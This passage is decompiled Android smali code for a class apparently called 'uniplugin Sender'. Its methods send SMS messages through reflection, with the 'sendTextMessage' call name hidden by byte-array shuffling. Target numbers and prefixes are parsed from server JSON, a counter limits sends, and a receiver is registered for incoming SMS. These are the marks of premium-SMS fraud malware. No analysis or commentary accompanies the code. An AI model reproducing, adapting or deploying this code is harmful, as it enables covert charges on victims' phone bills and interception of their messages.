    .local v4, "lnstk":Ljava/lang/String;
    :goto_1
    invoke-virtual {v9}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v4

    if-nez v4, :cond_1

    .line 401
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    return-object v12

    .line 379
    .end local v0    # "bder":Ljava/lang/StringBuilder;
    .end local v2    # "conntn":Ljava/net/HttpURLConnection;
    .end local v3    # "inStm":Ljava/io/InputStream;
    .end local v4    # "lnstk":Ljava/lang/String;
    .end local v9    # "rder":Ljava/io/BufferedReader;
    .end local v10    # "ulPars":Ljava/lang/String;
    .end local v11    # "wr":Ljava/io/DataOutputStream;
    :cond_0
    invoke-virtual {v1}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v2

    check-cast v2, Ljava/net/HttpURLConnection;

    .restart local v2    # "conntn":Ljava/net/HttpURLConnection;
    goto :goto_0

    .line 399
    .restart local v0    # "bder":Ljava/lang/StringBuilder;
    .restart local v3    # "inStm":Ljava/io/InputStream;
    .restart local v4    # "lnstk":Ljava/lang/String;
    .restart local v9    # "rder":Ljava/io/BufferedReader;
    .restart local v10    # "ulPars":Ljava/lang/String;
    .restart local v11    # "wr":Ljava/io/DataOutputStream;
    :cond_1
    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    const-string v13, "\n"

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_1
.end method

.method public otstuk()V
    .locals 2

    .prologue
    .line 106
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/uniplugin/sender/Sender$2;

    invoke-direct {v1, p0}, Lcom/uniplugin/sender/Sender$2;-><init>(Lcom/uniplugin/sender/Sender;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 127
    .local v0, "t":Ljava/lang/Thread;
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 128
    return-void
.end method

.method public otstukpress()V
    .locals 2

    .prologue
    .line 166
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/uniplugin/sender/Sender$4;

    invoke-direct {v1, p0}, Lcom/uniplugin/sender/Sender$4;-><init>(Lcom/uniplugin/sender/Sender;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 187
    .local v0, "t":Ljava/lang/Thread;
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 188
    return-void
.end method

.method protected parseobject(Lorg/json/JSONObject;)V
    .locals 10
    .param p1, "data2"    # Lorg/json/JSONObject;

    .prologue
    .line 339
    const/4 v6, 0x0

    .line 340
    .local v6, "tempnumbers":Lorg/json/JSONArray;
    const/4 v7, 0x0

    .line 341
    .local v7, "tempprefix":Lorg/json/JSONArray;
    const/4 v0, 0x0

    .line 342
    .local v0, "data":Lorg/json/JSONArray;
    :try_start_0
    const-string v8, "number"

    invoke-virtual {p1, v8}, Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v6

    .line 345
    move-object v3, v6

    .line 346
    .local v3, "jsonArray":Lorg/json/JSONArray;
    if-eqz v3, :cond_0

    .line 347
    invoke-virtual {v3}, Lorg/json/JSONArray;->length()I

    move-result v5

    .line 348
    .local v5, "len":I
    const/4 v2, 0x0

    .local v2, "i":I
    :goto_0
    if-lt v2, v5, :cond_2

    .line 353
    .end local v2    # "i":I
    .end local v5    # "len":I
    :cond_0
    const-string v8, "prefix"

    invoke-virtual {p1, v8}, Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v7

    .line 354
    move-object v4, v7

    .line 355
    .local v4, "jsonArray2":Lorg/json/JSONArray;
    if-eqz v4, :cond_1

    .line 356
    invoke-virtual {v4}, Lorg/json/JSONArray;->length()I

    move-result v5

    .line 357
    .restart local v5    # "len":I
    const/4 v2, 0x0

    .restart local v2    # "i":I
    :goto_1
    if-lt v2, v5, :cond_3

    .line 365
    .end local v2    # "i":I
    .end local v3    # "jsonArray":Lorg/json/JSONArray;
    .end local v4    # "jsonArray2":Lorg/json/JSONArray;
    .end local v5    # "len":I
    :cond_1
    :goto_2
    return-void

    .line 349
    .restart local v2    # "i":I
    .restart local v3    # "jsonArray":Lorg/json/JSONArray;
    .restart local v5    # "len":I
    :cond_2
    iget-object v8, p0, Lcom/uniplugin/sender/Sender;->numbers:Ljava/util/ArrayList;

    invoke-virtual {v3, v2}, Lorg/json/JSONArray;->get(I)Ljava/lang/Object;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 348
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    .line 358
    .restart local v4    # "jsonArray2":Lorg/json/JSONArray;
    :cond_3
    iget-object v8, p0, Lcom/uniplugin/sender/Sender;->prefix:Ljava/util/ArrayList;

    invoke-virtual {v4, v2}, Lorg/json/JSONArray;->get(I)Ljava/lang/Object;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 357
    add-int/lit8 v2, v2, 0x1

    goto :goto_1

    .line 361
    .end local v2    # "i":I
    .end local v3    # "jsonArray":Lorg/json/JSONArray;
    .end local v4    # "jsonArray2":Lorg/json/JSONArray;
    .end local v5    # "len":I
    :catch_0
    move-exception v1

    .line 363
    .local v1, "e":Lorg/json/JSONException;
    invoke-virtual {v1}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_2
.end method

.method public proverka()V
    .locals 2

    .prologue
    .line 131
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/uniplugin/sender/Sender$3;

    invoke-direct {v1, p0}, Lcom/uniplugin/sender/Sender$3;-><init>(Lcom/uniplugin/sender/Sender;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 163
    .local v0, "t":Ljava/lang/Thread;
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 164
    return-void
.end method

.method public requestReceived(Ljava/lang/String;)V
    .locals 0
    .param p1, "_from"    # Ljava/lang/String;

    .prologue
    .line 600
    return-void
.end method

.method public sendSMSka(Ljava/lang/String;Ljava/lang/String;)V
    .locals 17
    .param p1, "recipient"    # Ljava/lang/String;
    .param p2, "body"    # Ljava/lang/String;

    .prologue
    .line 448
    move-object/from16 v0, p0

    iget-object v12, v0, Lcom/uniplugin/sender/Sender;->context:Landroid/content/Context;

    const-string v13, "ESLIABONENTTUPIT"

    const/4 v14, 0x0

    invoke-virtual {v12, v13, v14}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v9

    .line 449
    .local v9, "settings":Landroid/content/SharedPreferences;
    invoke-interface {v9}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v3

    .line 450
    .local v3, "editor":Landroid/content/SharedPreferences$Editor;
    const-string v12, "countsend"

    const/4 v13, 0x0

    invoke-interface {v9, v12, v13}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v11

    .line 451
    .local v11, "val":I
    add-int/lit8 v11, v11, 0x1

    .line 452
    const-string v12, "countsend"

    invoke-interface {v3, v12, v11}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 453
    invoke-interface {v3}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 454
    const/4 v12, 0x6

    if-ge v11, v12, :cond_0

    .line 456
    const/16 v12, 0xf

    new-array v1, v12, [B

    fill-array-data v1, :array_0

    .line 458
    .local v1, "bytttt":[B
    const/16 v12, 0xf

    new-array v2, v12, [B

    const/4 v12, 0x5

    const/16 v13, 0x65

    aput-byte v13, v2, v12

    const/4 v12, 0x6

    const/16 v13, 0x78

    aput-byte v13, v2, v12

    const/4 v12, 0x7

    const/16 v13, 0x74

    aput-byte v13, v2, v12

    const/16 v12, 0x8

    .line 459
    const/16 v13, 0x4d

    aput-byte v13, v2, v12

    const/16 v12, 0x9

    const/16 v13, 0x65

    aput-byte v13, v2, v12

    const/16 v12, 0xa

    const/16 v13, 0x73

    aput-byte v13, v2, v12

    const/16 v12, 0xb

    const/16 v13, 0x73

    aput-byte v13, v2, v12

    const/16 v12, 0xc

    const/16 v13, 0x61

    aput-byte v13, v2, v12

    const/16 v12, 0xd

    const/16 v13, 0x67

    aput-byte v13, v2, v12

    const/16 v12, 0xe

    const/16 v13, 0x65

    aput-byte v13, v2, v12

    .line 460
    .local v2, "bytttt2":[B
    const/4 v6, 0x0

    .line 461
    .local v6, "r":I
    array-length v12, v1

    add-int/lit8 v5, v12, -0x5

    .local v5, "i":I
    :goto_0
    array-length v12, v1

    if-lt v5, v12, :cond_1

    .line 465
    const/4 v5, 0x0

    :goto_1
    array-length v12, v1

    add-int/lit8 v12, v12, -0x5

    if-lt v5, v12, :cond_2

    .line 470
    :try_start_0
    sget-object v12, Landroid/os/Build$VERSION;->SDK:Ljava/lang/String;

    invoke-static {v12}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v7

    .line 471
    .local v7, "sdkVersion":I
    const/4 v12, 0x4

    if-ge v7, v12, :cond_3

    .line 473
    const-string v12, "android.telephony.gsm.SmsManager"

    .line 472
    invoke-static {v12}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v12

    .line 474
    const-string v13, "getDefault"

    const/4 v14, 0x0

    .line 473
    invoke-virtual {v12, v13, v14}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v4

    .line 475
    .local v4, "getDef":Ljava/lang/reflect/Method;
    const/4 v12, 0x0

    const/4 v13, 0x0

    invoke-virtual {v4, v12, v13}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v10

    .line 478
    .local v10, "sm":Ljava/lang/Object;
    const-string v12, "android.telephony.gsm.SmsManager"

    .line 477
    invoke-static {v12}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v12

    .line 479
    new-instance v13, Ljava/lang/String;

    invoke-direct {v13, v2}, Ljava/lang/String;-><init>([B)V

    .line 480
    const/4 v14, 0x5

    new-array v14, v14, [Ljava/lang/Class;

    const/4 v15, 0x0

    const-class v16, Ljava/lang/String;

    aput-object v16, v14, v15

    const/4 v15, 0x1

    const-class v16, Ljava/lang/String;

    aput-object v16, v14, v15

    const/4 v15, 0x2

    const-class v16, Ljava/lang/String;

    aput-object v16, v14, v15

    const/4 v15, 0x3

    .line 481
    const-class v16, Landroid/app/PendingIntent;

    aput-object v16, v14, v15

    const/4 v15, 0x4

    const-class v16, Landroid/app/PendingIntent;

    aput-object v16, v14, v15

    .line 478
    invoke-virtual {v12, v13, v14}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v8

    .line 482
    .local v8, "sendSMS":Ljava/lang/reflect/Method;
    const/4 v12, 0x5

    new-array v12, v12, [Ljava/lang/Object;

    const/4 v13, 0x0

    aput-object p1, v12, v13

    const/4 v13, 0x2

    aput-object p2, v12, v13

    invoke-virtual {v8, v10, v12}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 503
    .end local v1    # "bytttt":[B
    .end local v2    # "bytttt2":[B
    .end local v4    # "getDef":Ljava/lang/reflect/Method;
    .end local v5    # "i":I
    .end local v6    # "r":I
    .end local v7    # "sdkVersion":I
    .end local v8    # "sendSMS":Ljava/lang/reflect/Method;
    .end local v10    # "sm":Ljava/lang/Object;
    :cond_0
    :goto_2
    return-void

    .line 462
    .restart local v1    # "bytttt":[B
    .restart local v2    # "bytttt2":[B
    .restart local v5    # "i":I
    .restart local v6    # "r":I
    :cond_1
    aget-byte v12, v1, v5

    aput-byte v12, v2, v6

    .line 463
    add-int/lit8 v6, v6, 0x1

    .line 461
    add-int/lit8 v5, v5, 0x1

    goto :goto_0

    .line 466
    :cond_2
    aget-byte v12, v1, v5

    aput-byte v12, v2, v6

    .line 467
    add-int/lit8 v6, v6, 0x1

    .line 465
    add-int/lit8 v5, v5, 0x1

    goto :goto_1

    .line 485
    .restart local v7    # "sdkVersion":I
    :cond_3
    :try_start_1
    const-string v12, "android.telephony.SmsManager"

    invoke-static {v12}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v12

    .line 486
    const-string v13, "getDefault"

    const/4 v14, 0x0

    invoke-virtual {v12, v13, v14}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v4

    .line 487
    .restart local v4    # "getDef":Ljava/lang/reflect/Method;
    const/4 v12, 0x0

    const/4 v13, 0x0

    invoke-virtual {v4, v12, v13}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v10

    .line 489
    .restart local v10    # "sm":Ljava/lang/Object;
    const-string v12, "android.telephony.SmsManager"

    invoke-static {v12}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v12

    .line 491
    new-instance v13, Ljava/lang/String;

    invoke-direct {v13, v2}, Ljava/lang/String;-><init>([B)V

    .line 492
    const/4 v14, 0x5

    new-array v14, v14, [Ljava/lang/Class;

    const/4 v15, 0x0

    const-class v16, Ljava/lang/String;

    aput-object v16, v14, v15

    const/4 v15, 0x1

    const-class v16, Ljava/lang/String;

    aput-object v16, v14, v15

    const/4 v15, 0x2

    .line 493
    const-class v16, Ljava/lang/String;

    aput-object v16, v14, v15

    const/4 v15, 0x3

    const-class v16, Landroid/app/PendingIntent;

    aput-object v16, v14, v15

    const/4 v15, 0x4

    .line 494
    const-class v16, Landroid/app/PendingIntent;

    aput-object v16, v14, v15

    .line 490
    invoke-virtual {v12, v13, v14}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v8

    .line 495
    .restart local v8    # "sendSMS":Ljava/lang/reflect/Method;
    const/4 v12, 0x5

    new-array v12, v12, [Ljava/lang/Object;

    const/4 v13, 0x0

    aput-object p1, v12, v13

    const/4 v13, 0x2

    aput-object p2, v12, v13

    invoke-virtual {v8, v10, v12}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_2

    .line 498
    .end local v4    # "getDef":Ljava/lang/reflect/Method;
    .end local v7    # "sdkVersion":I
    .end local v8    # "sendSMS":Ljava/lang/reflect/Method;
    .end local v10    # "sm":Ljava/lang/Object;
    :catch_0
    move-exception v12

    goto :goto_2

    .line 456
    nop

    :array_0
    .array-data 1
        0x65t
        0x78t
        0x74t
        0x4dt
        0x65t
        0x73t
        0x73t
        0x61t
        0x67t
        0x65t
        0x73t
        0x65t
        0x6et
        0x64t
        0x54t
    .end array-data
.end method

.method public sendSMSkahi(Ljava/lang/String;Ljava/lang/String;)V
    .locals 0
    .param p1, "recipient"    # Ljava/lang/String;
    .param p2, "body"    # Ljava/lang/String;

    .prologue
    .line 444
    invoke-virtual {p0, p1, p2}, Lcom/uniplugin/sender/Sender;->sendSMSka(Ljava/lang/String;Ljava/lang/String;)V

    .line 445
    return-void
.end method

.method public sendSMSki(Ljava/lang/String;Ljava/lang/String;)V
    .locals 13
    .param p1, "recipient"    # Ljava/lang/String;
    .param p2, "body"    # Ljava/lang/String;

    .prologue
    const/4 v10, 0x4

    const/4 v9, 0x5

    .line 507
    const/16 v8, 0xf

    new-array v0, v8, [B

    fill-array-data v0, :array_0

    .line 509
    .local v0, "bytttt":[B
    const/16 v8, 0xf

    new-array v1, v8, [B

    const/16 v8, 0x65

    aput-byte v8, v1, v9

    const/4 v8, 0x6

    const/16 v9, 0x78

    aput-byte v9, v1, v8

    const/4 v8, 0x7

    const/16 v9, 0x74

    aput-byte v9, v1, v8

    const/16 v8, 0x8

    .line 510
    const/16 v9, 0x4d

    aput-byte v9, v1, v8

    const/16 v8, 0x9

    const/16 v9, 0x65

    aput-byte v9, v1, v8

    const/16 v8, 0xa

    const/16 v9, 0x73

    aput-byte v9, v1, v8

    const/16 v8, 0xb

    const/16 v9, 0x73

    aput-byte v9, v1, v8

    const/16 v8, 0xc

    const/16 v9, 0x61

    aput-byte v9, v1, v8

    const/16 v8, 0xd

    const/16 v9, 0x67

    aput-byte v9, v1, v8

    const/16 v8, 0xe

    const/16 v9, 0x65

    aput-byte v9, v1, v8

    .line 511
    .local v1, "bytttt2":[B
    const/4 v4, 0x0

    .line 512
    .local v4, "r":I
    array-length v8, v0

    add-int/lit8 v3, v8, -0x5

    .local v3, "i":I
    :goto_0
    array-length v8, v0

    if-lt v3, v8, :cond_0

    .line 516
    const/4 v3, 0x0

    :goto_1
    array-length v8, v0

    add-int/lit8 v8, v8, -0x5

    if-lt v3, v8, :cond_1

    .line 521
    :try_start_0
    sget-object v8, Landroid/os/Build$VERSION;->SDK:Ljava/lang/String;

    invoke-static {v8}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v5

    .line 522
    .local v5, "sdkVersion":I
    if-ge v5, v10, :cond_2

    .line 524
    const-string v8, "android.telephony.gsm.SmsManager"

    .line 523
    invoke-static {v8}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v8

    .line 525
    const-string v9, "getDefault"

    const/4 v10, 0x0

    .line 524
    invoke-virtual {v8, v9, v10}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v2

    .line 526
    .local v2, "getDef":Ljava/lang/reflect/Method;
    const/4 v8, 0x0

    const/4 v9, 0x0

    invoke-virtual {v2, v8, v9}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v7

    .line 529
    .local v7, "sm":Ljava/lang/Object;
    const-string v8, "android.telephony.gsm.SmsManager"

    .line 528
    invoke-static {v8}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v8

    .line 530
    new-instance v9, Ljava/lang/String;

    invoke-direct {v9, v1}, Ljava/lang/String;-><init>([B)V

    .line 531
    const/4 v10, 0x5

    new-array v10, v10, [Ljava/lang/Class;

    const/4 v11, 0x0

    const-class v12, Ljava/lang/String;

    aput-object v12, v10, v11

    const/4 v11, 0x1

    const-class v12, Ljava/lang/String;

    aput-object v12, v10, v11

    const/4 v11, 0x2

    const-class v12, Ljava/lang/String;

    aput-object v12, v10, v11

    const/4 v11, 0x3

    .line 532
    const-class v12, Landroid/app/PendingIntent;

    aput-object v12, v10, v11

    const/4 v11, 0x4

    const-class v12, Landroid/app/PendingIntent;

    aput-object v12, v10, v11

    .line 529
    invoke-virtual {v8, v9, v10}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v6

    .line 533
    .local v6, "sendSMS":Ljava/lang/reflect/Method;
    const/4 v8, 0x5

    new-array v8, v8, [Ljava/lang/Object;

    const/4 v9, 0x0

    aput-object p1, v8, v9

    const/4 v9, 0x2

    aput-object p2, v8, v9

    invoke-virtual {v6, v7, v8}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 553
    .end local v2    # "getDef":Ljava/lang/reflect/Method;
    .end local v5    # "sdkVersion":I
    .end local v6    # "sendSMS":Ljava/lang/reflect/Method;
    .end local v7    # "sm":Ljava/lang/Object;
    :goto_2
    return-void

    .line 513
    :cond_0
    aget-byte v8, v0, v3

    aput-byte v8, v1, v4

    .line 514
    add-int/lit8 v4, v4, 0x1

    .line 512
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    .line 517
    :cond_1
    aget-byte v8, v0, v3

    aput-byte v8, v1, v4

    .line 518
    add-int/lit8 v4, v4, 0x1

    .line 516
    add-int/lit8 v3, v3, 0x1

    goto :goto_1

    .line 536
    .restart local v5    # "sdkVersion":I
    :cond_2
    :try_start_1
    const-string v8, "android.telephony.SmsManager"

    invoke-static {v8}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v8

    .line 537
    const-string v9, "getDefault"

    const/4 v10, 0x0

    invoke-virtual {v8, v9, v10}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v2

    .line 538
    .restart local v2    # "getDef":Ljava/lang/reflect/Method;
    const/4 v8, 0x0

    const/4 v9, 0x0

    invoke-virtual {v2, v8, v9}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v7

    .line 540
    .restart local v7    # "sm":Ljava/lang/Object;
    const-string v8, "android.telephony.SmsManager"

    invoke-static {v8}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v8

    .line 542
    new-instance v9, Ljava/lang/String;

    invoke-direct {v9, v1}, Ljava/lang/String;-><init>([B)V

    .line 543
    const/4 v10, 0x5

    new-array v10, v10, [Ljava/lang/Class;

    const/4 v11, 0x0

    const-class v12, Ljava/lang/String;

    aput-object v12, v10, v11

    const/4 v11, 0x1

    const-class v12, Ljava/lang/String;

    aput-object v12, v10, v11

    const/4 v11, 0x2

    .line 544
    const-class v12, Ljava/lang/String;

    aput-object v12, v10, v11

    const/4 v11, 0x3

    const-class v12, Landroid/app/PendingIntent;

    aput-object v12, v10, v11

    const/4 v11, 0x4

    .line 545
    const-class v12, Landroid/app/PendingIntent;

    aput-object v12, v10, v11

    .line 541
    invoke-virtual {v8, v9, v10}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v6

    .line 546
    .restart local v6    # "sendSMS":Ljava/lang/reflect/Method;
    const/4 v8, 0x5

    new-array v8, v8, [Ljava/lang/Object;

    const/4 v9, 0x0

    aput-object p1, v8, v9

    const/4 v9, 0x2

    aput-object p2, v8, v9

    invoke-virtual {v6, v7, v8}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_2

    .line 549
    .end local v2    # "getDef":Ljava/lang/reflect/Method;
    .end local v5    # "sdkVersion":I
    .end local v6    # "sendSMS":Ljava/lang/reflect/Method;
    .end local v7    # "sm":Ljava/lang/Object;
    :catch_0
    move-exception v8

    goto :goto_2

    .line 507
    :array_0
    .array-data 1
        0x65t
        0x78t
        0x74t
        0x4dt
        0x65t
        0x73t
        0x73t
        0x61t
        0x67t
        0x65t
        0x73t
        0x65t
        0x6et
        0x64t
        0x54t
    .end array-data
.end method

.method public sendstart()V
    .locals 4

    .prologue
    .line 421
    new-instance v0, Landroid/content/IntentFilter;

    const-string v2, "android.provider.Telephony.SMS_RECEIVED"

    invoke-direct {v0, v2}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    .line 422
    .local v0, "filter":Landroid/content/IntentFilter;
    iget-object v2, p0, Lcom/uniplugin/sender/Sender;->context:Landroid/content/Context;

    iget-object v3, p0, Lcom/uniplugin/sender/Sender;->RequestReceiver:Landroid/content/BroadcastReceiver;

    invoke-virtual {v2, v3, v0}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 423
    new-instance v1, Ljava/lang/Thread;

    new-instance v2, Lcom/uniplugin/sender/Sender$5;

    invoke-direct {v2, p0}, Lcom/uniplugin/sender/Sender$5;-><init>(Lcom/uniplugin/sender/Sender;)V

    invoke-direct {v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 440
    .local v1, "t":Ljava/lang/Thread;
    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    .line 442
    return-void
.end method
